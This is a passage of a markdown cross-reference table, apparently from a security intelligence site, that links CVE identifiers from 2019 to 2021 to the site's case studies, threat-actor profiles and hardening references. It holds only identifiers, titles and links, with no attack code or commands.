| [CVE-2019-0604](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-0604) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2019-0703](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-0703) | [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2019-0708](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-0708) | [Network Protocols Security Reference](/NETWORK_PROTOCOLS_SECURITY.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [Slide plan: The Year 2019 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2019.md) |
| [CVE-2019-1579](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-1579) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md) |
| [CVE-2019-1652](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-1652) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2019-1653](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-1653) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2019-2215](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-2215) | [Mobile Security Reference](/MOBILE_SECURITY_REFERENCE.md) |
| [CVE-2019-2725](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-2725) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2019-3396](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-3396) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Slide plan: APT41: The Public Record, 2012 to 2026](/case-studies/slides/plans/APT41_PUBLIC_RECORD.md) |
| [CVE-2019-3398](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-3398) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2019-3568](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-3568) | [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2019-5544](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-5544) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md) |
| [CVE-2019-5591](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-5591) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md) |
| [CVE-2019-5736](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-5736) | [Container Security Reference](/CONTAINER_SECURITY_REFERENCE.md), [Kubernetes Security Reference](/KUBERNETES_SECURITY_REFERENCE.md), [Container & Kubernetes Security](/disciplines/container-kubernetes-security.md) |
| [CVE-2019-7192](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-7192) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2019-7195](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-7195) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2019-7256](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-7256) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2019-7609](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-7609) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2019-8394](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-8394) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2019-9670](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-9670) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2019-10149](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-10149) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Sandworm: The Operations in the Public Record](/case-studies/SANDWORM_OPERATIONS.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2019 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2019.md), [Slide plan: Sandworm: The Operations in the Public Record](/case-studies/slides/plans/SANDWORM_OPERATIONS.md) |
| [CVE-2019-11043](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-11043) | [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2019-11510](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-11510) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: APT41: The Public Record, 2012 to 2026](/case-studies/slides/plans/APT41_PUBLIC_RECORD.md), [Slide plan: The Year 2019 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2019.md), [Slide plan: The Year 2020 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2020.md), [Slide plan: SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/slides/plans/SOLARWINDS_SUNBURST.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2019-11539](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-11539) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2019-11580](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-11580) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2019-15107](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-15107) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md) |
| [CVE-2019-15271](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-15271) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2019-16278](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-16278) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md) |
| [CVE-2019-16759](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-16759) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md) |
| [CVE-2019-16920](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-16920) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2019-17621](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-17621) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2019-18935](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-18935) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md) |
| [CVE-2019-19781](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-19781) | [HONEYPOT & DECEPTION TECHNOLOGY REFERENCE](/HONEYPOT_DECEPTION_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: APT41: The Public Record, 2012 to 2026](/case-studies/slides/plans/APT41_PUBLIC_RECORD.md), [Slide plan: The Year 2019 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2019.md), [Slide plan: The Year 2020 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2020.md), [Slide plan: SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/slides/plans/SOLARWINDS_SUNBURST.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2020-0601](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0601) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-0674](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0674) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2020-0688](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0688) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [Operation Exchange Marauder and the 2021 Exchange Server Mass Exploitation](/case-studies/EXCHANGE_MARAUDER_2021.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/slides/plans/SOLARWINDS_SUNBURST.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2020-0787](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0787) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-0796](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0796) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Windows Hardening Reference](/WINDOWS_HARDENING.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-0938](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-0938) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2020-1020](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1020) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2020-1350](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1350) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-1472](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1472) | [CVE Reference Guide](/CVE_REFERENCE.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Windows Hardening and GPO Reference](/WINDOWS_HARDENING_GPO.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2020 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2020.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2020-1938](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-1938) | [The Dell RecoverPoint for Virtual Machines Hard-Coded Credential Zero-Day of 2026 (CVE-2026-22769): A Case Study](/case-studies/DELL_RECOVERPOINT_CVE_2026_22769.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Ghostcat, CVE-2020-1938: The Tomcat AJP File Read in the Lab](/case-studies/GHOSTCAT_CVE_2020_1938.md), [Magento and Adobe Commerce, CVE-2026-48356: Lab-Verified Exposure and Fix](/case-studies/MAGENTO_CVE_2026_48356.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Ghostcat, CVE-2020-1938: The Tomcat AJP File Read in the Lab](/case-studies/slides/plans/GHOSTCAT_CVE_2020_1938.md) |
| [CVE-2020-2021](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-2021) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-3259](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-3259) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2020-3992](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-3992) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2020-4006](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-4006) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2020-5902](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-5902) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2020 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2020.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2020-6287](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-6287) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-8515](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-8515) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2020-10148](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-10148) | [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [Slide plan: SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/slides/plans/SOLARWINDS_SUNBURST.md) |
| [CVE-2020-10189](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-10189) | [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [Slide plan: APT41: The Public Record, 2012 to 2026](/case-studies/slides/plans/APT41_PUBLIC_RECORD.md) |
| [CVE-2020-12271](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-12271) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2020-12641](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-12641) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2020-12812](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-12812) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md) |
| [CVE-2020-14750](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-14750) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-14882](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-14882) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2020-14883](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-14883) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md) |
| [CVE-2020-15505](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-15505) | [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Slide plan: The Year 2020 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2020.md) |
| [CVE-2020-15999](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-15999) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2020-25506](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-25506) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2020-27930](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-27930) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2020-29583](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-29583) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2020-35730](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-35730) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2020-36193](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2020-36193) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2021-1497](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-1497) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-1675](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-1675) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Penetration Testing Checklists](/PENTEST_CHECKLISTS.md), [Windows Hardening and GPO Reference](/WINDOWS_HARDENING_GPO.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md) |
| [CVE-2021-1732](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-1732) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2021-1879](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-1879) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2021-3156](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-3156) | [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2021-3199](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-3199) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2021-4034](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-4034) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Privilege Escalation Reference](/PRIVESC_REFERENCE.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2021-20016](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-20016) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md) |
| [CVE-2021-20038](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-20038) | [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [North Korea-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_NORTH_KOREA.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: North Korea-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_NORTH_KOREA.md) |
| [CVE-2021-20090](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-20090) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-21972](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-21972) | [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md) |
| [CVE-2021-22005](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22005) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-22204](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22204) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2021-22205](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22205) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2021-22681](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22681) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Slide plan: Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/slides/plans/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2021-22893](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2021-22893) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2021 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2021.md) |
